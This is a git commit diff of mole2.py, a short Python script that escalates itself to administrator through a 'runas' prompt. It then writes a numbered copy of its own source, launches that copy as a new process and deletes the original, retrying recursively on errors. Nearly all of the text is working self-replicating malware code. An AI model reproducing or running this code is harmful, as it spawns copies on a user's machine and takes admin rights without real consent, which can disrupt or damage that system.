56cf81e4748154297a4f70be18aabce9d4f42a5d
DAF201 <56328675+DAF201@users.noreply.github.com>
2021-10-06 00:28:34 -0500

    Update mole2.py

--- mole2.py
+++ mole2.py
@@ -1,44 +1,35 @@
 times = 0
 PATH = ''
-# this is the first mole!
-import subprocess,os,sys,ctypes
-times = times+1
-this = __file__
-
-
+import subprocess
+import os
+import ctypes, sys
 if ctypes.windll.shell32.IsUserAnAdmin():
     pass
 else:
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
     sys.exit()
-
+times = times+1
+this = __file__
 def self_copy():
-    with open(__file__, 'r+')as this_file:
+    with open(__file__, 'r')as this_file:
         this = this_file.readlines()[2:]
     temp = ''
     for x in this:
         temp = temp+x
     this = temp
-    with open("mole"+str(times)+".py", 'w+')as file:
+    with open("mole"+str(times)+".py", 'w')as file:
         file.write('times=%s\nPATH=r"%s"\n%s' % (times, __file__, this))
-
-
 def call_up():
     print('this is the %s mole!' % (times-1))
     subprocess.Popen("python mole"+str(times)+".py")
-
-
 def change():
     try:
         self_copy()
     except:
         change()
-    finally:
-        call_up()
     try:
-        os.remove(PATH)
+        call_up()
     except:
         change()
-
-
+    os.remove(__file__)
 change()
